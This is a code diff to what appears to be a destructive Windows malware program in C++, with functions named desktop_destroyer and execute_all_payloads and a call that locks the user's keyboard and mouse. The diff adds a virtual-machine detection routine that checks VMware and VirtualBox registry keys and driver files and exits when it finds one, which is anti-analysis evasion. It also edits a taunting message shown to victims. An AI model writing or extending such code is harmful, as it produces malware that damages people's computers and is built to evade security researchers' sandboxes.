@@ -996,7 +996,7 @@ void desktop_destroyer()
 
     // final MessageBox instead of console output
     MessageBoxW(nullptr,
-        L"to 赵灿鑫\r\n\ryour pc just fucked up by sw.cc",
+        L"ur pc just fuck up",
         L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
 
     Sleep(10000);
@@ -1390,8 +1390,45 @@ DWORD WINAPI execute_all_payloads(LPVOID)
     return 0;
 }
 
+bool is_vm()
+{
+    // check for VM registry keys
+    const wchar_t* regKeys[] = {
+        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
+        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+        L"SOFTWARE\\Classes\\Applications\\VMwareHostOpen.exe",
+        L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
+        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+        L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
+        L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
+    };
+    for (auto* k : regKeys) {
+        HKEY hk;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, k, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
+            RegCloseKey(hk);
+            return true;
+        }
+    }
+    // check for VM drivers
+    const wchar_t* drivers[] = {
+        L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
+        L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
+        L"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
+        L"C:\\Windows\\System32\\drivers\\vmmouse.sys",
+    };
+    for (auto* d : drivers) {
+        if (GetFileAttributesW(d) != INVALID_FILE_ATTRIBUTES) return true;
+    }
+    return false;
+}
+
 int main()
 {
+    if (is_vm()) {
+        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
+        return 0;
+    }
+
     BlockInput(TRUE);  // lock keyboard & mouse immediately
 
     print_banner();
